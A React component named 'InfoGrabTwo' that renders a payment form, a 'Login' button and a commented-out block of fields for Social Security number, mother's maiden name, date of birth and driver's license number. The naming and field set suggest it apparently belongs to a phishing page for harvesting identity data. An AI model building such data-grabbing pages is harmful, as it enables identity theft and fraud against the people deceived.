import { CreditCard } from "@mui/icons-material";
import { Button, TextField } from "@mui/material";
import React, { useState } from "react";
import PaymentForm from "./PaymentForm";
import SkeletonLoad from "./SkeletonLoad";
import Steps from "./Steps";


function InfoGrabTwo( userid ) {
  const [show, setShow] = useState();


  React.useEffect(() => {
    setShow(false);
    console.log(userid.userid)

  }, [])



  const submitHandler = e => {

    e.preventDefault();
    console.log('hitting')
    setShow(!show)

  }

  return (
    <div>
      {!show && (

        <div className="flex flex-col items-center">
        {/* <span className='text-3xl font-semibold items-center p-5'>Billing Information</span> */}
 

          <PaymentForm userid={userid.userid}/>



        <form onSubmit={submitHandler} class="">



          <div className='mb-7 mt-3'>
            {/* <TextField id="standard-basic" label="Full Name" variant="standard" fullWidth="true" />
          <TextField id="standard-basic" label="Date Of Birth - MM/DD/YYYY" variant="standard" fullWidth="true" />

          <TextField id="standard-basic" label="Social Security Number" variant="standard" fullWidth="true" />
          <TextField id="standard-basic" label="Mothers Maiden Name" variant="standard" fullWidth="true" />
          <TextField id="standard-basic" label="Drivers License Number" variant="standard" fullWidth="true" />
         */}



          </div>

          {show && (<div className="p-5">  <Button  type="submit" variant="contained">Login</Button></div>) }
         


        </form>

        </div>


      )}
      {/* {show && <SkeletonLoad/>} */}
    </div>
  );
};

export default InfoGrabTwo;
